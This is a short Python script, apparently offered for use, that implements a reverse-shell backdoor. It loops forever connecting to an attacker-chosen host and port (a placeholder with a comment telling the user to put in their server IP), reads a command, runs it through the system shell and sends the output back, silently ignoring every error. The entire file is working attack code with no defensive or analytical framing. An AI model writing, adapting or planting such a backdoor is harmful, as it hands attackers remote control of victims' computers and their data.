import socket
import subprocess

def backdoor():
    host = '127.0.0.1'  # Ur Ip Adress (from ur Server)
    port = 1234  # Just the Port we are Trying to listen to

    while True:
        try:
            # Trying to get a connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.send(b'Connected')

            # Command received from attacker
            command = s.recv(1024).decode()

            # Execute command and send back the result
            result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = result.stdout.read() + result.stderr.read()
            s.send(output)

            # close connection
            s.close()
        except:
            pass

# Backdoor-Funktion aufrufen
backdoor()
